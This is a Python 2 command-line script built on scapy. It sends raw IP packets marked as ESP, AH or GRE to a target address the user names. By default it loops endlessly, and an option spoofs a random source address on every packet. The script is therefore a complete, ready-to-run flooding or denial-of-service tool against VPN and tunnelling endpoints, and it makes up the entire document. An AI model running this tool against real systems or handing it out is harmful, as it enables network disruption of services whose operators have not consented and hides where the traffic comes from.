#!/usr/bin/env python

import sys
import time
import random
from optparse import OptionParser
from hexdump import hexdump
from socket import inet_ntoa, inet_aton
from struct import pack, unpack
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

def long2ip(ip):
    return inet_ntoa(pack("!L", ip))

def ip2long(long):
    return struct.unpack("!L", socket.inet_aton(long))[0]

def randip():
    return long2ip(random.randint(0, 2L**32-1))

def main():
    parser = OptionParser(usage="%prog --target=IPv4 [-s] [-v]", version="%prog 1.0")
    parser.add_option("-t", "--target", dest="target", help="IPv4 address of target", metavar="IPv4", type="string")
    parser.add_option("-s", "--spoofed", dest="spoofed", default=False, help="send spoofed source in packets", action="store_true")
    parser.add_option("-v", "--verbose", dest="verbose", default=False, help="print hexdumps of packets to stdout", action="store_true")
    parser.add_option("-o", "--once", dest="once", default=False, help="send packet only once", action="store_true")
    parser.add_option("-a", "--ah", dest="ah", default=False, help="set esp protocol to ah protocol", action="store_true")
    parser.add_option("-g", "--gre", dest="gre", default=False, help="set esp protocol to gre protocol", action="store_true")

    (options, args) = parser.parse_args()
    
    if not options.target:
        parser.print_help()
        return
    
    target = options.target
    
    try:
        socket.inet_aton(target)
    except socket.error:
        print "[-] Value of target must be valid IPv4 address"
        return
    
    conf.verb = 0
    random.seed(time.time())
    
    print "[+] Target: %s" % (target)
    
    packet = IP()
    packet.dst = target
    packet.ttl = random.randint(100, 130)
    packet.proto = 50
    
    if options.ah:
        packet.proto = 51
    elif options.gre:
        packet.proto = 47
    
    print "[ ] Working ..."
    
    try:
        while 1:
            packet.id = random.randint(0, 2L**16-1)
            
            if options.spoofed:
                packet.src = randip()
            
            tosend = Ether() / packet
            
            if options.verbose:
                hexdump(tosend)
                
            sendp(tosend)
            
            if options.once:
                break
    except KeyboardInterrupt:
        print "[+] Interrupted"
        return
    
    print "[+] All done exiting"
    
if __name__ == "__main__":
    main()
